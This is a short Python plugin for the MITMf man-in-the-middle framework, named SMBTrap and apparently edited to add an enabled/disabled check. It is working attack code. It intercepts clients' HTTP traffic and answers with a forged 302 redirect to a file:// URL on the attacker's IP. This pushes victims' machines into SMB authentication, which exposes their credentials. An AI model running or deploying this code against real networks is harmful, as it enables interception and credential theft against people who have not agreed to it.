"""

[enabled | disabled] by @xtr4nge

"""

import logging
import random
import string
from plugins.plugin import Plugin
from core.utils import SystemConfig

from configobj import ConfigObj

mitmf_logger = logging.getLogger("mitmf")

class SMBTrap(Plugin):
	name = "SMBTrap"
	optname = "smbtrap"
	desc = "Exploits the SMBTrap vulnerability on connected clients"
	version = "1.0"
	has_opts = False

	# @xtr4nge
	def getStatus(self):
		self.pluginStatus = ConfigObj("config/plugins.conf")
		if self.pluginStatus['plugins'][self.optname]['status'] == "enabled":
			return True
		else:
			return False

	def initialize(self, options):
		self.ourip = SystemConfig.getIP(options.interface)

	def serverResponseStatus(self, request, version, code, message):
		if self.getStatus():
			return {"request": request, "version": version, "code": 302, "message": "Found"}

	def serverHeaders(self, response, request):
		if self.getStatus():
			mitmf_logger.info("{} [SMBTrap] Trapping request to {}".format(request.client.getClientIP(), request.headers['host']))
			response.headers["Location"] = "file://{}/{}".format(self.ourip, ''.join(random.sample(string.ascii_uppercase + string.digits, 8)))
